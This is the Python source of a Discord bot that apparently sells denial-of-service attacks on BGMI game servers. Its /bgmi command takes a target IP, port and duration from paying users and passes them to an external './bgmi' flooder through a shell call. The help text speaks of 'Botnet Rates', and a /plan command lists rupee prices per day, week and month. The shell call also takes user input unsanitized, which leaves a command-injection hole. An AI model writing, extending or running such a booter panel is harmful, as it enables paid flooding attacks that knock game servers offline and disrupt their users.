import discord
from discord.ext import commands
import subprocess
import datetime
import os

# Insert your Discord bot token here
TOKEN = '1254032338510417972'

# Admin user IDs
admin_ids = {"1109767358886723627", "6406776405", "1600832237"}  # Replace these with actual Discord user IDs

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Initialize bot
bot = commands.Bot(command_prefix='/')

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    user_info = bot.get_user(user_id)
    username = user_info.name if user_info else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.command()
@commands.has_permissions(administrator=True)
async def add(ctx, user_id: str):
    if user_id not in allowed_user_ids:
        allowed_user_ids.append(user_id)
        with open(USER_FILE, "a") as file:
            file.write(f"{user_id}\n")
        await ctx.send(f"User {user_id} added successfully 👍.")
    else:
        await ctx.send("User already exists 🤦‍♂️.")

@bot.command()
@commands.has_permissions(administrator=True)
async def remove(ctx, user_id: str):
    if user_id in allowed_user_ids:
        allowed_user_ids.remove(user_id)
        with open(USER_FILE, "w") as file:
            for user_id in allowed_user_ids:
                file.write(f"{user_id}\n")
        await ctx.send(f"User {user_id} removed successfully 👍.")
    else:
        await ctx.send(f"User {user_id} not found in the list.")

@bot.command()
@commands.has_permissions(administrator=True)
async def clearlogs(ctx):
    response = clear_logs()
    await ctx.send(response)

@bot.command()
@commands.has_permissions(administrator=True)
async def allusers(ctx):
    try:
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
            if user_ids:
                response = "Authorized Users:\n" + "\n".join(user_ids)
            else:
                response = "No data found."
    except FileNotFoundError:
        response = "No data found."
    await ctx.send(response)

@bot.command()
@commands.has_permissions(administrator=True)
async def logs(ctx):
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                await ctx.send(file=discord.File(file, LOG_FILE))
        except FileNotFoundError:
            await ctx.send("No data found.")
    else:
        await ctx.send("No data found.")

@bot.command()
async def id(ctx):
    user_id = str(ctx.author.id)
    await ctx.send(f"🤖Your ID: {user_id}")

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

@bot.command()
async def bgmi(ctx, target: str, port: int, time: int):
    user_id = str(ctx.author.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_ids:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                await ctx.send("You are on cooldown. Please wait before running the /bgmi command again.")
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()

        if time > 181:
            response = "Error: Time interval must be less than 80."
        else:
            record_command_logs(user_id, '/bgmi', target, port, time)
            log_command(user_id, target, port, time)
            response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
            await ctx.send(response)
            full_command = f"./bgmi {target} {port} {time} 200"
            subprocess.run(full_command, shell=True)
            await ctx.send(f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}")
    else:
        await ctx.send("You are not authorized to use this command.")

@bot.command()
async def mylogs(ctx):
    user_id = str(ctx.author.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
        await ctx.send(response)
    else:
        await ctx.send("You are not authorized to use this command.")

@bot.command()
async def help(ctx):
    help_text = '''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers.
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.
'''
    await ctx.send(help_text)

@bot.command()
async def start(ctx):
    user_name = ctx.author.name
    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
🤖Try To Run This Command : /help 
'''
    await ctx.send(response)

@bot.command()
async def rules(ctx):
    user_name = ctx.author.name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    await ctx.send(response)

@bot.command()
async def plan(ctx):
    user_name = ctx.author.name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 180 (S)
> After Attack Limit : 5 Min
-> Concurrents Attack : 3

Pr-ice List💸 :
Day-->100 Rs
Week-->400 Rs
Month-->800 Rs
'''
    await ctx.send(response)

@bot.command()
@commands.has_permissions(administrator=True)
async def admincmd(ctx):
    user_name = ctx.author.name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    await ctx.send(response)

@bot.command()
@commands.has_permissions(administrator=True)
async def broadcast(ctx, *, message_to_broadcast: str):
    async for guild in bot.fetch_guilds():
        for member in guild.members:
            try:
                await member.send(f"⚠️ Message To All Users By Admin:\n\n{message_to_broadcast}")
            except Exception as e:
                print(f"Failed to send broadcast message to user {member.id}: {str(e)}")
    await ctx.send("Broadcast message sent successfully to all users 👍.")

@bot.event
async def on_ready():
    print(f'Bot is ready. Logged in as {bot.user}')

bot.run(TOKEN)
